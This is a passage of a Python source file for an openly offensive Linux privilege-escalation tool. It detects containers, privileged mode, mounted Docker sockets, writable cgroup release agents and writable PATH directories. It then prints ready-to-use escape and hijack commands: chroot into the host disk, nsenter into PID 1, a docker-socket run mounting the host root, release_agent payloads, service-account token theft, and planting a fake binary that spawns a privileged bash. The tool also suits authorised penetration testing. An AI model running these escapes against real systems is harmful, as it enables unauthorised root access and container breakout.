        C.info(f"Found {len(findings)} binaries with capabilities")
        for path, caps in findings:
            dangerous = cls.dangerous_caps(caps)
            suggestions = cls.exploit_suggestions(path, caps)
            if dangerous:
                C.warn(f"{C.RED}{path}{C.R}  caps: {', '.join(caps)}")
                for cap_name, desc in dangerous:
                    C.p(f"      {C.YLW}DANGEROUS: {cap_name}{C.R} - {desc}")
                for s in suggestions:
                    C.p(f"      {C.GRN}EXPLOIT: {s}{C.R}")
            else:
                C.info(f"{path}  caps: {', '.join(caps)}")


# =============================================================================
#  CONTAINER ESCAPE DETECTION
# =============================================================================

class ContainerEscape:
    @classmethod
    def detect_container(cls) -> Tuple[bool, str]:
        if os.path.exists("/.dockerenv"):
            return True, "docker"
        if os.path.exists("/run/.containerenv"):
            return True, "podman"
        cgroup = ""
        try:
            with open("/proc/1/cgroup", "r") as f:
                cgroup = f.read()
        except (FileNotFoundError, PermissionError):
            pass
        if "docker" in cgroup or "containerd" in cgroup:
            return True, "docker"
        if "lxc" in cgroup:
            return True, "lxc"
        if "kubepods" in cgroup:
            return True, "kubernetes"
        pid1 = _run("cat /proc/1/sched 2>/dev/null | head -1")
        if pid1 and "init" not in pid1 and "systemd" not in pid1:
            return True, "container"
        if os.path.exists("/var/run/secrets/kubernetes.io"):
            return True, "kubernetes"
        mountinfo = _run("cat /proc/1/mountinfo 2>/dev/null")
        if "overlay" in mountinfo and "/docker/" in mountinfo:
            return True, "docker"
        return False, "host"

    @classmethod
    def check_privileged(cls) -> Tuple[bool, List[str]]:
        indicators: List[str] = []
        capeff = ""
        try:
            with open("/proc/self/status", "r") as f:
                for line in f:
                    if line.startswith("CapEff:"):
                        capeff = line.split(":")[1].strip()
                        break
        except (FileNotFoundError, PermissionError):
            pass
        if capeff and int(capeff, 16) >= 0x0000003fffffffff:
            indicators.append("Full capability set detected (privileged mode)")
        if os.path.exists("/dev/sda") or os.path.exists("/dev/vda"):
            indicators.append("Host block device accessible")
        seccomp = ""
        try:
            with open("/proc/self/status", "r") as f:
                for line in f:
                    if line.startswith("Seccomp:"):
                        seccomp = line.split(":")[1].strip()
                        break
        except (FileNotFoundError, PermissionError):
            pass
        if seccomp == "0":
            indicators.append("Seccomp disabled (no syscall filtering)")
        apparmor = _run("cat /proc/self/attr/current 2>/dev/null")
        if apparmor and "unconfined" in apparmor:
            indicators.append("AppArmor profile: unconfined")
        return bool(indicators), indicators

    @classmethod
    def check_socket_mount(cls) -> bool:
        return os.path.exists("/var/run/docker.sock") or os.path.exists("/run/docker.sock")

    @classmethod
    def check_host_mount(cls) -> List[str]:
        mounts: List[str] = []
        try:
            with open("/proc/mounts", "r") as f:
                for line in f:
                    parts = line.split()
                    if len(parts) >= 2:
                        mp = parts[1]
                        if mp in ("/host", "/hostfs", "/mnt/host") or "host" in mp.lower():
                            mounts.append(mp)
        except (FileNotFoundError, PermissionError):
            pass
        return mounts

    @classmethod
    def check_release_agent(cls) -> bool:
        cgroup_root = "/sys/fs/cgroup"
        if not os.path.isdir(cgroup_root):
            return False
        agent_path = os.path.join(cgroup_root, "release_agent")
        if os.path.exists(agent_path) and _is_writable(agent_path):
            return True
        for dirpath, dirs, files in os.walk(cgroup_root):
            if "release_agent" in files:
                ra = os.path.join(dirpath, "release_agent")
                if _is_writable(ra):
                    return True
            if dirpath.count(os.sep) - cgroup_root.count(os.sep) > 2:
                break
        return False

    @classmethod
    def escape_suggestions(cls, runtime: str, privileged: bool,
                           socket: bool, host_mounts: List[str],
                           release_agent: bool) -> List[str]:
        escapes: List[str] = []
        if privileged:
            escapes.append("PRIVILEGED: mount host disk -> mount /dev/sda1 /mnt -> chroot /mnt")
            escapes.append("PRIVILEGED: nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash")
        if socket:
            escapes.append("DOCKER SOCKET: docker -H unix:///var/run/docker.sock run -v /:/hostfs -it alpine chroot /hostfs")
        if host_mounts:
            for mp in host_mounts:
                escapes.append(f"HOST MOUNT: writable host filesystem at {mp}")
        if release_agent:
            escapes.append("RELEASE AGENT: write payload to cgroup release_agent for host execution")
        if runtime == "kubernetes":
            escapes.append("K8S: check for service account token at /var/run/secrets/kubernetes.io/serviceaccount/token")
            escapes.append("K8S: attempt kubectl access with mounted service account")
        return escapes

    @classmethod
    def run(cls) -> None:
        C.p(f"\n{C.CYN}{C.BLD}=== CONTAINER ESCAPE DETECTION ==={C.R}")
        is_container, runtime = cls.detect_container()
        if not is_container:
            C.ok("Not running inside a container")
            return
        C.warn(f"Running inside a {C.RED}{runtime}{C.R} container")
        priv, priv_indicators = cls.check_privileged()
        if priv:
            C.warn(f"{C.RED}PRIVILEGED CONTAINER DETECTED{C.R}")
            for ind in priv_indicators:
                C.p(f"      {C.YLW}{ind}{C.R}")
        else:
            C.ok("Container does not appear to be privileged")
        socket = cls.check_socket_mount()
        if socket:
            C.warn(f"{C.RED}Docker socket is mounted!{C.R}")
        host_mounts = cls.check_host_mount()
        if host_mounts:
            C.warn(f"Host filesystem mounts detected: {', '.join(host_mounts)}")
        release = cls.check_release_agent()
        if release:
            C.warn(f"{C.RED}Writable cgroup release_agent found{C.R}")
        escapes = cls.escape_suggestions(runtime, priv, socket, host_mounts, release)
        if escapes:
            C.p(f"\n  {C.RED}{C.BLD}Escape Techniques:{C.R}")
            for e in escapes:
                C.p(f"    {C.GRN}-> {e}{C.R}")
        else:
            C.ok("No obvious container escape vectors found")


# =============================================================================
#  PATH HIJACKING ANALYSIS
# =============================================================================

class PATHHijack:
    SYSTEM_DIRS: Set[str] = {"/usr/bin", "/usr/sbin", "/bin", "/sbin",
                             "/usr/local/bin", "/usr/local/sbin"}

    @classmethod
    def analyze_path(cls) -> List[Tuple[str, str]]:
        issues: List[Tuple[str, str]] = []
        path_dirs = os.environ.get("PATH", "").split(":")
        seen_system = False
        for d in path_dirs:
            d = d.strip()
            if not d:
                continue
            is_sys = d in cls.SYSTEM_DIRS
            if is_sys:
                seen_system = True
            if not is_sys and not seen_system and _is_writable(d):
                issues.append((d, "Writable directory appears before system dirs in PATH"))
            if d == "." or not d.startswith("/"):
                issues.append((d, "Relative/current directory in PATH - trivial hijack"))
        return issues

    @classmethod
    def find_writable_in_path(cls) -> List[str]:
        writable: List[str] = []
        for d in os.environ.get("PATH", "").split(":"):
            d = d.strip()
            if d and os.path.isdir(d) and _is_writable(d):
                writable.append(d)
        return writable

    @classmethod
    def find_relative_calls(cls, search_dirs: Optional[List[str]] = None) -> List[Tuple[str, str]]:
        if search_dirs is None:
            search_dirs = ["/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly",
                           "/etc/cron.weekly", "/etc/cron.monthly", "/usr/local/bin"]
        results: List[Tuple[str, str]] = []
        cmd_pattern = re.compile(
            r"(?:^|\s|;|&&|\|\|)"
            r"(?!#)"
            r"([a-zA-Z][\w.-]+)"
            r"(?:\s|$)"
        )
        for d in search_dirs:
            if not os.path.isdir(d):
                continue
            try:
                for entry in os.scandir(d):
                    if not entry.is_file():
                        continue
                    try:
                        with open(entry.path, "r", errors="replace") as f:
                            for lineno, line in enumerate(f, 1):
                                line = line.strip()
                                if not line or line.startswith("#"):
                                    continue
                                for m in cmd_pattern.finditer(line):
                                    cmd = m.group(1)
                                    if "/" not in cmd and cmd not in (
                                        "if", "then", "else", "fi", "for", "do", "done",
                                        "while", "case", "esac", "in", "echo", "exit",
                                        "return", "true", "false", "test", "set", "export",
                                        "local", "shift", "break", "continue", "read",
                                    ):
                                        results.append((entry.path, f"Line {lineno}: '{cmd}' called without absolute path"))
                    except (PermissionError, OSError):
                        continue
            except (PermissionError, OSError):
                continue
        return results

    @classmethod
    def simulate_hijack(cls, command: str) -> str:
        writable = cls.find_writable_in_path()
        if not writable:
            return f"No writable PATH directories - cannot hijack '{command}'"
        target = writable[0]
        return (
            f"To hijack '{command}', place a malicious binary at:\n"
            f"  {target}/{command}\n"
            f"  echo '#!/bin/bash\\n/bin/bash -p' > {target}/{command} && chmod +x {target}/{command}\n"
            f"  Any script calling '{command}' without absolute path will execute your version first."
        )

    @classmethod
    def run(cls) -> None:
        C.p(f"\n{C.CYN}{C.BLD}=== PATH HIJACKING ANALYSIS ==={C.R}")
        path_dirs = os.environ.get("PATH", "").split(":")
        C.info(f"PATH has {len(path_dirs)} directories")
        issues = cls.analyze_path()
        if issues:
            C.warn(f"Found {C.RED}{len(issues)}{C.R} PATH issues:")
            for d, desc in issues:
                C.p(f"    {C.YLW}{d}{C.R} - {desc}")
        else:
            C.ok("PATH order appears safe")
        writable = cls.find_writable_in_path()
        if writable:
            C.warn(f"Writable directories in PATH:")
            for d in writable:
                C.p(f"    {C.RED}{d}{C.R}")
        else:
            C.ok("No writable directories in PATH")
        relative = cls.find_relative_calls()
        if relative:
            C.warn(f"Found {len(relative)} scripts using relative commands:")
            for fp, detail in relative[:20]:
                C.p(f"    {C.DIM}{fp}{C.R}: {detail}")
            if len(relative) > 20:
                C.p(f"    {C.DIM}... and {len(relative) - 20} more{C.R}")


# =============================================================================
#  CLI ENTRY POINT
# =============================================================================

def _run_full() -> None:
    KernelCVEMapper.run()
    SUIDFinder.run()
    CronAbuse.run()
    CapabilityChecker.run()
    ContainerEscape.run()
    PATHHijack.run()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="FU PERSON :: Linux Exploitation & Privilege Escalation Module",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "examples:\n"
            "  %(prog)s full              Run all modules\n"
            "  %(prog)s kernel            Kernel CVE mapping\n"
            "  %(prog)s suid              SUID/SGID binary analysis\n"
            "  %(prog)s cron              Cron job abuse detection\n"
            "  %(prog)s caps              Linux capability audit\n"
            "  %(prog)s container         Container escape detection\n"
            "  %(prog)s path              PATH hijacking analysis\n"
            "  %(prog)s kernel --json     Output as JSON\n"
        ),
    )
    sub = parser.add_subparsers(dest="module", help="Module to run")
    sub.add_parser("kernel",    help="Map kernel version to known CVEs")
    sub.add_parser("suid",      help="Find and analyze SUID/SGID binaries")
    sub.add_parser("cron",      help="Detect exploitable cron configurations")
    sub.add_parser("caps",      help="Audit Linux capabilities on binaries")
    sub.add_parser("container", help="Detect container and escape vectors")
    sub.add_parser("path",      help="Analyze PATH for hijacking opportunities")
    sub.add_parser("full",      help="Run all modules")
    parser.add_argument("--json", action="store_true", help="Output results as JSON")
    args = parser.parse_args()

    C.banner()

    if args.json:
        results: Dict[str, Any] = {}
        kver = KernelCVEMapper.get_kernel_version()
        if args.module in ("kernel", "full", None):
            hits = KernelCVEMapper.check(kver)
            results["kernel"] = {
                "version": kver,
                "cves": [{"cve_id": c.cve_id, "cvss": c.cvss, "description": c.description,
                           "has_exploit": c.has_exploit, "exploit_url": c.exploit_url} for c in hits],
            }
        if args.module in ("suid", "full", None):
            suids = SUIDFinder.find_suid()
            sgids = SUIDFinder.find_sgid()
            suid_data = []
            for p in suids:
                techs = SUIDFinder.check_gtfobins(p)
                suid_data.append({"path": p, "type": "suid", "gtfobins": techs,
                                  "risk": SUIDFinder.risk_assessment(p, techs)})
            for p in sgids:
                techs = SUIDFinder.check_gtfobins(p)
                suid_data.append({"path": p, "type": "sgid", "gtfobins": techs,
                                  "risk": SUIDFinder.risk_assessment(p, techs)})
            results["suid_sgid"] = suid_data
        if args.module in ("caps", "full", None):
            findings = CapabilityChecker.find_caps()
            results["capabilities"] = [
                {"binary": p, "caps": c,
                 "dangerous": [d[0] for d in CapabilityChecker.dangerous_caps(c)],
                 "exploits": CapabilityChecker.exploit_suggestions(p, c)} for p, c in findings
            ]
        if args.module in ("container", "full", None):
            is_c, rt = ContainerEscape.detect_container()
            priv, indicators = ContainerEscape.check_privileged()
            results["container"] = {
                "is_container": is_c, "runtime": rt, "privileged": priv,
                "indicators": indicators,
                "docker_socket": ContainerEscape.check_socket_mount(),
                "host_mounts": ContainerEscape.check_host_mount(),
            }
        if args.module in ("path", "full", None):
            results["path"] = {
                "issues": [{"dir": d, "desc": desc} for d, desc in PATHHijack.analyze_path()],
                "writable": PATHHijack.find_writable_in_path(),
            }
        print(json.dumps(results, indent=2))
        return

    dispatch = {
        "kernel":    KernelCVEMapper.run,
        "suid":      SUIDFinder.run,
        "cron":      CronAbuse.run,
        "caps":      CapabilityChecker.run,
        "container": ContainerEscape.run,
        "path":      PATHHijack.run,
        "full":      _run_full,
    }

    if args.module:
        dispatch[args.module]()
    else:
        _run_full()

    C.p(f"\n{C.DIM}{'=' * 79}{C.R}")
    C.p(f"{C.DIM}  Scan complete. Review findings and validate manually before exploitation.{C.R}")
    C.p(f"{C.DIM}{'=' * 79}{C.R}\n")


if __name__ == "__main__":
    main()
